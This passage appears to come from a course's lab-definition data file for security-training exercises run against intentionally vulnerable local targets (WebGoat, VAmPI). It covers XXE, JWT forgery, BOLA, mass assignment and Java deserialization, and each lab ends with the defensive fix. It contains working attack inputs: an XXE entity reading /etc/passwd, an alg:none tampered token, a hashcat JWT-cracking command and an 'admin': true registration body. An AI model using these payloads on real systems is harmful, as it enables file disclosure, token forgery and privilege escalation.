      `Find the exercise's XML-accepting feature and, using your browser's dev tools or Burp, intercept the request it sends so you can edit the raw XML body directly`,
      `Inject a DOCTYPE declaring a SYSTEM entity pointing at a local file, e.g. <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><comment><text>&xxe;</text></comment>, and confirm the resolved file content is reflected back to you`,
      `Move to the lesson's blind/out-of-band XXE exercise, where the response no longer reflects the file's content directly -- follow the exercise's own guidance on triggering and confirming an out-of-band interaction (e.g. an externally-referenced DTD) to prove the entity still resolved even without a visible answer`,
      `Confirm WebGoat marks each completed stage solved with its green 'Solved' indicator`,
      `Write 2-3 sentences on why disabling DOCTYPE processing (or external entity resolution specifically) in the XML parser is the actual fix, rather than filtering or sanitizing the XML body`,
    ],
    resources: [
      {
        title: "WebGoat (GitHub)",
        url: "https://github.com/WebGoat/WebGoat",
        type: "tool",
      },
      {
        title: "OWASP WebGoat project page",
        url: "https://owasp.org/www-project-webgoat/",
        type: "link",
      },
      {
        title: "OWASP: XML External Entity (XXE) Processing",
        url: "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
        type: "link",
      },
      {
        title: "OWASP XXE Prevention Cheat Sheet",
        url: "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
        type: "link",
      },
    ],
    completionIndicator: `WebGoat's own lesson tracker showing a green 'Solved' indicator on the XXE lesson stages, with a screenshot of the intercepted XML request/response pair showing your DOCTYPE SYSTEM entity resolved and its file content reflected back.`,
    dockerImage: "webgoat/webgoat",
    containerPort: 8080,
    slides: [
      {
        title: "Register and open the XXE lesson",
        body: "WebGoat runs entirely locally under the /WebGoat path -- register your own account, then open the 'XXE' lesson category and read why a default XML parser configuration resolves external entities without being asked to.",
        diagram: {
          type: "container-arch",
          hostLabel: "localhost:18080/WebGoat",
          containerLabel: "webgoat container",
          image: "webgoat/webgoat",
          hostPort: 18080,
          containerPort: 8080,
        },
      },
      {
        title: "Intercept the XML-accepting request",
        body: "Use dev tools or Burp to catch the exercise's request and edit its raw XML body directly -- the feature exists to accept structured XML input, which is exactly the surface XXE needs.",
      },
      {
        title: "Read a local file with a SYSTEM entity",
        body: 'A DOCTYPE declaring an entity with SYSTEM "file:///etc/passwd", referenced as &xxe; inside the XML body, makes the parser fetch that file and inline its contents into the response you get back.',
        diagram: {
          type: "request-response",
          leftLabel: "You",
          rightLabel: "WebGoat (XML parser)",
          exchanges: [
            {
              direction: "right",
              label: "malicious XML",
              payload:
                '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>...&xxe;...',
            },
            {
              direction: "left",
              label: "200 OK",
              payload: "file contents reflected in the response",
            },
          ],
        },
      },
      {
        title: "Blind XXE: no direct answer to read",
        body: "The follow-on exercise doesn't reflect the file back to you at all -- you have to trigger and confirm the entity still resolved through an out-of-band interaction, reasoning about the request chain instead of reading a page.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Craft XML with external DTD reference",
              detail: "no direct file:// read this time",
            },
            {
              label: "Server parses the DOCTYPE",
              detail: "fetches the externally-referenced DTD",
            },
            {
              label: "DTD defines a parameter entity",
              detail: "chains into reading the target file",
            },
            {
              label: "Out-of-band interaction confirms it",
              detail: "response still gives no visible answer",
            },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "Reflected XXE is the easy case to catch in review; blind XXE is what survives into production because nothing in the response looks wrong. The actual fix is the same either way: disable DOCTYPE processing or external entity resolution in the parser configuration itself, not filtering what the XML body is allowed to contain.",
      },
    ],
    hints: [
      "The exercise's feature normally exchanges XML behind the scenes -- intercept the request with dev tools or Burp so you can edit the raw XML body instead of only using whatever the UI form exposes.",
      "A DOCTYPE declaring a SYSTEM entity pointing at file:///etc/passwd, referenced as &xxe; somewhere inside the XML body's text content, makes the parser resolve and inline that file's contents into the response (step 4).",
      "For the blind exercise, the response won't hand you the file content directly -- follow the lesson's own steps for triggering an out-of-band interaction (an externally-referenced DTD) so you can confirm the entity resolved without ever seeing the answer reflected back (step 5).",
    ],
  },
  {
    id: "L57",
    number: 57,
    week: 10,
    moduleId: "m10",
    title: "JWT Attacks on WebGoat",
    description:
      "A JWT is only as trustworthy as the signature verification behind it, and WebGoat's JSON Web Tokens lesson category walks through two of the most common ways that verification breaks down in practice. First you decode a real token to see exactly what a JWT actually is -- three base64url segments, not an opaque blob -- then exploit a server that accepts an unsigned 'alg: none' token as if it were valid, and finally recover a signing secret weak enough to brute-force offline and use it to forge a token for a different identity. Both bugs share the same root cause: the server trusted the token's claims without actually verifying who could have produced that signature.",
    objective:
      "Decode a WebGoat-issued JWT, exploit its alg:none / unverified-signature exercise to submit a tampered unsigned token, then brute-force a weak HS256 signing secret and use it to forge a token for another identity.",
    successCriteria: [
      "Decoded a WebGoat JWT and identified its algorithm and claims",
      "Modified the header's alg to none, stripped the signature, and had the tampered token accepted",
      "Brute-forced a weak HS256 signing secret offline and used it to sign a forged token for a different user",
      "WebGoat's lesson tracker shows a green 'Solved' indicator on both JWT exercises",
    ],
    platform: "WebGoat (Docker)",
    difficulty: "medium",
    estimatedHours: 3,
    instructions: [
      `Click 'Start Lab' above, then browse to http://localhost:18080/WebGoat, and register your own account (or log in with an account from an earlier WebGoat lab)`,
      `Open the 'JSON Web Tokens' lesson category, obtain a token issued by the first exercise, and decode it at jwt.io (or manually by base64url-decoding each dot-separated segment) -- note the algorithm in the header and the claims in the payload`,
      `Work the alg:none exercise: change the header's "alg" value to "none", remove the signature segment entirely (keeping the trailing dot), tamper with a claim in the payload (e.g. your username or a role field), and submit the modified token -- confirm the server accepts it without verifying any signature`,
      `Work the weak-secret exercise: take the HS256-signed token from that stage and brute-force its signing secret offline with a wordlist, using hashcat (mode 16500, JWT) or jwt_tool's -C crack mode`,
      `Once you recover the secret, use it to sign a new token claiming a different user's identity, then submit that forged token against the exercise's protected endpoint and confirm it's accepted`,
      `Confirm WebGoat marks both stages solved with its green 'Solved' indicator`,
      `Write one sentence per finding naming the missing server-side control: failing to reject "alg: none" / enforce an allowed algorithm list, and using a signing secret weak enough to crack offline`,
    ],
    resources: [
      {
        title: "WebGoat (GitHub)",
        url: "https://github.com/WebGoat/WebGoat",
        type: "tool",
      },
      {
        title: "OWASP WebGoat project page",
        url: "https://owasp.org/www-project-webgoat/",
        type: "link",
      },
      { title: "jwt.io — JWT decoder", url: "https://jwt.io", type: "tool" },
      {
        title: "jwt_tool (GitHub)",
        url: "https://github.com/ticarpi/jwt_tool",
        type: "tool",
      },
      {
        title: "OWASP JWT Cheat Sheet",
        url: "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html",
        type: "link",
      },
    ],
    completionIndicator: `WebGoat's own lesson tracker showing a green 'Solved' indicator on both JWT exercises, plus a screenshot of the accepted alg:none tampered token and the forged HS256 token signed with the recovered secret.`,
    dockerImage: "webgoat/webgoat",
    containerPort: 8080,
    slides: [
      {
        title: "Decode the token first",
        body: "A JWT is three base64url segments joined by dots -- header, payload, signature. Decode WebGoat's issued token at jwt.io and note its algorithm and claims before touching anything.",
        diagram: {
          type: "container-arch",
          hostLabel: "localhost:18080/WebGoat",
          containerLabel: "webgoat container",
          image: "webgoat/webgoat",
          hostPort: 18080,
          containerPort: 8080,
        },
      },
      {
        title: "alg:none: a token with no signature at all",
        body: 'Change the header\'s alg to "none", delete the signature segment entirely, tamper with a claim, and submit it -- if the server only checks the alg field and skips verification for "none", it accepts a token anyone could have written by hand.',
        diagram: {
          type: "request-response",
          leftLabel: "You",
          rightLabel: "WebGoat",
          exchanges: [
            {
              direction: "right",
              label: "tampered token",
              payload: '{"alg":"none","typ":"JWT"}.{"user":"admin"}.',
            },
            {
              direction: "left",
              label: "200 OK",
              payload: "accepted -- no signature verified",
            },
          ],
        },
      },
      {
        title: "Crack a weak HS256 secret offline",
        body: "The second exercise's token is genuinely signed, but with a secret short enough to brute-force with a wordlist -- hashcat mode 16500 or jwt_tool's crack mode recovers it without ever touching the server.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            { command: "hashcat -m 16500 token.txt wordlist.txt" },
            { output: "Recovered secret: ********" },
          ],
        },
      },
      {
        title: "Forge a token, become someone else",
        body: "With the recovered secret in hand, sign a brand-new token claiming a different user's identity and submit it against the exercise's protected endpoint -- the server can't tell it apart from a real one because the signature checks out.",
        diagram: {
          type: "comparison",
          columns: [
            {
              label: "alg:none",
              points: [
                "signature removed entirely",
                "server skips verification for 'none'",
              ],
            },
            {
              label: "weak HS256 secret",
              points: [
                "signature present and valid",
                "but secret is crackable offline",
                "forged token verifies successfully",
              ],
              highlighted: true,
            },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "Both bugs boil down to the same missing check: the server never actually confirmed that only it could have produced that signature -- either by accepting no signature at all, or by using a secret an attacker could reproduce. That's why real JWT libraries require you to pin an expected algorithm, not just read whatever the token claims.",
      },
    ],
    hints: [
      "Decode the token at jwt.io first so you can see exactly what you're editing -- the header carries the algorithm, the payload carries the claims you'll want to tamper with (step 2).",
      'For alg:none, change the header\'s alg field to "none" and delete the signature segment but keep the trailing dot -- some libraries treat "none" as a valid, unverified algorithm rather than rejecting it outright (step 3).',
      "For the weak-secret exercise, feed the HS256 token to hashcat mode 16500 or jwt_tool's -C crack mode with a wordlist -- once you have the secret, you can sign your own token for any identity you want and it will pass verification (steps 4-5).",
    ],
  },
  {
    id: "L58",
    number: 58,
    week: 10,
    moduleId: "m10",
    title: "API BOLA & Mass Assignment on VAmPI",
    description:
      "VAmPI is a small, intentionally vulnerable Flask REST API with no browser UI to lean on -- every finding here comes from reading and rewriting a raw JSON request. This lab has you register and log in to get a JWT, then chain two OWASP API Top 10 findings: Broken Object Level Authorization, where your own token is enough to pull a different user's account object just by changing the username in the URL, and Mass Assignment, where the registration endpoint accepts a field -- an admin flag -- that the client was never supposed to be able to set, letting you create a brand-new account that's already an admin with nothing more than an extra JSON key.",
    objective:
      "Register and authenticate against VAmPI's REST API, exploit Broken Object Level Authorization to read another user's account object, then exploit Mass Assignment on the registration endpoint to create a new account with admin=true.",
    successCriteria: [
      "Registered a user and obtained a JWT via VAmPI's login endpoint",
      "Retrieved a different user's account object using only your own JWT, via BOLA on the per-user endpoint",
      "Added an unexpected admin field to a registration request and confirmed the API accepted it, creating a new account with admin already set to true",
      "Both findings mapped to their OWASP API Top 10 category with the exact request that triggered each",
    ],
    platform: "VAmPI (Docker)",
    difficulty: "medium",
    estimatedHours: 3,
    instructions: [
      `Click 'Start Lab' above, then confirm the API is reachable at http://localhost:18080/ -- you should get a JSON response, not a webpage -- and open the Swagger UI at http://localhost:18080/ui (or /docs) to see every available route before testing`,
      `Register two users via the /users/v1/register endpoint, then log in as the first one to obtain a JWT`,
      `Exploit Broken Object Level Authorization: using only user 1's JWT, request user 2's account object at the per-user endpoint (GET /users/v1/<username>) and confirm the API returns user 2's data without checking that the token belongs to that user`,
      `Exploit Mass Assignment: register a third account via POST /users/v1/register, but include an "admin": true field in the JSON body alongside username/password/email -- the endpoint isn't meant to let a caller set that field, but it silently accepts it`,
      `Confirm the escalation: log in as the new account to get its JWT, then call GET /me with Authorization: Bearer <that JWT> -- unlike the per-user endpoint used for the BOLA step, /me's response includes the admin field, so check whether it now reads true`,
      `Decode your own JWT at jwt.io and note its signing algorithm and claims`,
      `Write a short report: which OWASP API Top 10 category each finding maps to (Broken Object Level Authorization, Mass Assignment) and the exact request that triggered each`,
    ],
    resources: [
      {
        title: "VAmPI (GitHub)",
        url: "https://github.com/erev0s/VAmPI",
        type: "tool",
      },
      {
        title: "OWASP API Security Top 10",
        url: "https://owasp.org/www-project-api-security/",
        type: "link",
      },
      {
        title: "OWASP Mass Assignment Cheat Sheet",
        url: "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html",
        type: "link",
      },
      { title: "jwt.io — JWT decoder", url: "https://jwt.io", type: "tool" },
    ],
    completionIndicator: `Request/response pairs showing the successful BOLA request (a different user's account object returned using your own token) and the mass-assignment registration request/response showing the newly created account's admin field set to true.`,
    dockerImage: "erev0s/vampi",
    containerPort: 5000,
    slides: [
      {
        title: "No UI -- read the Swagger spec first",
        body: "Confirm the API is up with a JSON response, then open its Swagger UI at /ui or /docs to see every registration, login, and user-management route before sending a single test request.",
        diagram: {
          type: "container-arch",
          hostLabel: "localhost:18080",
          containerLabel: "vampi container",
          image: "erev0s/vampi",
          hostPort: 18080,
          containerPort: 5000,
        },
      },
      {
        title: "Register two users, log in as one",
        body: "Create two accounts through /users/v1/register, then log in as the first one to get a JWT -- everything after this uses only that one token.",
      },
      {
        title: "BOLA: your token, someone else's object",
        body: "GET the per-user endpoint with user 2's username in the URL, while authenticated only as user 1 -- the API hands back user 2's full account object because it checks that a token exists, not that it belongs to the resource being requested.",
        diagram: {
          type: "request-response",
          leftLabel: "You (user 1)",
          rightLabel: "VAmPI API",
          exchanges: [
            {
              direction: "right",
              label: "GET /users/v1/<user2>",
              payload: "Authorization: Bearer <user1 JWT>",
            },
            {
              direction: "left",
              label: "200 OK",
              payload: "user 2's full account object",
            },
          ],
        },
      },
      {
        title: "Mass assignment: register your way to admin",
        body: 'The registration endpoint binds the whole request body to the new user object instead of only the fields it\'s documented to accept -- adding "admin": true to the registration JSON sets a field the client was never supposed to control.',
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Find the registration endpoint",
              detail: "via the Swagger UI, POST /users/v1/register",
            },
            {
              label: "Send the required fields",
              detail: "username, password, email",
            },
            {
              label: "Add an unexpected field",
              detail: '"admin": true, never exposed in the UI or docs',
            },
            {
              label: "Log in as the new account, call GET /me",
              detail: "/me (unlike the per-user endpoint) returns admin: true",
            },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "Both findings came from reading and rewriting a raw JSON request, not clicking through a page -- BOLA and Mass Assignment are consistently the top two categories in the OWASP API Security Top 10, because API backends bind request data to internal objects far more directly than a rendered web form ever would.",
      },
    ],
    hints: [
      "Open the Swagger UI at /ui or /docs before testing anything -- it lists the exact registration, login, per-user, and update paths this lab needs, and current path names can drift slightly between VAmPI versions.",
      "For BOLA, register two users, log in as the first, then request the second user's account by username at the per-user GET endpoint using only the first user's token -- nothing in the request should let you see it, but nothing on the server stops it either.",
      'For mass assignment, register a new account via POST /users/v1/register with an "admin": true field added to the JSON body alongside username/password/email -- then log in as that account and call GET /me with its token (the per-user endpoint never returns the admin field, but /me does) to confirm admin actually stuck.',
    ],
  },
  {
    id: "L59",
    number: 59,
    week: 10,
    moduleId: "m10",
    title: "Insecure Deserialization on WebGoat",
    description:
      "Deserializing untrusted data means letting whoever sent it dictate the internal state -- and sometimes the behavior -- of objects your own server then trusts. WebGoat's Insecure Deserialization lesson hands you a base64-encoded, Java-serialized object (a task-holder carrying a task name and a requested execution time) exchanged with the client in a cookie or hidden field, and the exercise is only solved once you deserialize it, understand its fields, modify one, and replay a re-serialized version that changes the server's own observable behavior. Because the effect the lesson checks for is measurable -- a specific, verifiable delay -- you get concrete proof that you controlled server-side object state purely by crafting bytes, with no application logic bug exploited beyond the act of deserializing something you shouldn't have been trusted to write.",
    objective:
      "Decode, modify, and replay a serialized Java object from WebGoat's Insecure Deserialization lesson so that the server's resulting behavior (a verifiable execution delay) is fully attacker-controlled.",
    successCriteria: [
      "Located and base64-decoded the serialized Java object WebGoat exchanges with the client",
      "Identified the object's class and fields (a task name and a requested execution time)",
      "Modified the object's field(s), re-serialized and re-encoded it, and replayed it in place of the original",
      "The server's observed behavior (the measured delay) matches the attacker-controlled value, and WebGoat's tracker marks the lesson solved",
    ],
    platform: "WebGoat (Docker)",
    difficulty: "hard",
    estimatedHours: 3,
    instructions: [
      `Click 'Start Lab' above, then browse to http://localhost:18080/WebGoat, and register your own account (or log in with an account from an earlier WebGoat lab)`,
      `Open the 'Insecure Deserialization' lesson category and read its explanation of why deserializing untrusted data with Java's ObjectInputStream lets the sender control the resulting object's state`,
      `Using dev tools or Burp, locate the base64-encoded serialized object the lesson exchanges with the client (typically in a cookie or hidden field) and base64-decode it to inspect the raw serialized bytes`,
      `Identify the object's class and fields -- it's a task-holder object carrying a task name and a requested execution time -- either by inspecting the lesson's own source/decompiled class or by reasoning from the serialized field names visible in the decoded bytes`,
      `Write or adapt a small Java program to deserialize the object, modify its requested-execution-time field to a specific value the lesson can verify, and re-serialize it back to bytes`,
      `Base64-encode the modified object and replace the original cookie/field value with it, then submit the request`,
      `Confirm the server's observed delay matches the value you set -- proving you controlled server-side behavior purely through the deserialized object's state -- and check that WebGoat marks the lesson solved`,
      `Write 2-3 sentences on why deserializing this object without validating its class or field values is equivalent to trusting arbitrary attacker-supplied object state, and what a safer alternative (allow-listing deserializable classes, or switching to a data format like JSON with no executable-object surface) would look like`,
    ],
    resources: [
      {
        title: "WebGoat (GitHub)",
        url: "https://github.com/WebGoat/WebGoat",
        type: "tool",
      },
      {
        title: "OWASP WebGoat project page",
        url: "https://owasp.org/www-project-webgoat/",
        type: "link",
      },
      {
        title: "OWASP Deserialization Cheat Sheet",
        url: "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html",
        type: "link",
      },
      {
        title: "OWASP: Insecure Deserialization",
        url: "https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data",
        type: "link",
      },
    ],
    completionIndicator: `WebGoat's own lesson tracker showing a green 'Solved' indicator on the Insecure Deserialization lesson, plus a screenshot of the decoded original object's fields alongside your modified, re-serialized replacement and the server's resulting measured delay.`,
    dockerImage: "webgoat/webgoat",
    containerPort: 8080,
    slides: [
      {
        title: "A serialized object, handed to the client",
        body: "WebGoat exchanges a base64-encoded, Java-serialized task-holder object with the client in a cookie or hidden field -- decode it and you're looking at the raw bytes of a real server-side object.",
        diagram: {
          type: "container-arch",
          hostLabel: "localhost:18080/WebGoat",
          containerLabel: "webgoat container",
          image: "webgoat/webgoat",
          hostPort: 18080,
          containerPort: 8080,
        },
      },
      {
        title: "Decode it and find the fields",
        body: "Base64-decode the object and identify its class and fields -- a task name and a requested execution time -- either from the lesson's own class or by reading field names directly out of the serialized bytes.",
      },
      {
        title: "Modify, re-serialize, replay",
        body: "Deserialize the object in a small Java program, change the requested-execution-time field to a value you choose, re-serialize it back to bytes, base64-encode it, and submit it in place of the original.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Decode original object",
              detail: "base64 → raw serialized bytes",
            },
            {
              label: "Deserialize in Java",
              detail: "ObjectInputStream reconstructs the task-holder",
            },
            {
              label: "Modify a field",
              detail: "set requestedExecutionTime to a chosen value",
            },
            {
              label: "Re-serialize + re-encode",
              detail: "ObjectOutputStream → base64",
            },
            {
              label: "Replay the request",
              detail: "server deserializes your version, not the original",
            },
          ],
        },
      },
      {
        title: "Prove it with a measurable effect",
        body: "The lesson checks for a specific, verifiable delay -- if the server's observed timing matches the value you injected, that's concrete proof you controlled its internal object state purely by crafting bytes, not by exploiting any other application bug.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command:
                "time curl -b 'token=<your re-encoded object>' http://localhost:18080/WebGoat/...",
            },
            {
              output:
                "real 0m5.1s -- matches your injected requestedExecutionTime",
            },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "The vulnerability here isn't a missing input check on a form field -- it's trusting an entire object's internal state to whoever sent the bytes. That's why the real fix is never a filter on the serialized data; it's not deserializing untrusted input at all, or restricting deserialization to an explicit allow-list of safe classes.",
      },
    ],
    hints: [
      "Find the base64-encoded serialized object first -- it's usually sitting in a cookie or hidden field the lesson's page already sends -- and decode it to see the raw bytes before writing any code (step 3).",
      "You don't need to guess the class -- the decoded bytes carry the field names directly, and they describe a task-holder object with a task name and a requested execution time (step 4).",
      "Write a small Java program that deserializes the object with ObjectInputStream, sets the requested-execution-time field to a specific value, re-serializes it with ObjectOutputStream, and base64-encodes the result -- replay that in place of the original and check whether the server's actual delay matches what you set (steps 5-7).",
    ],
  },
]
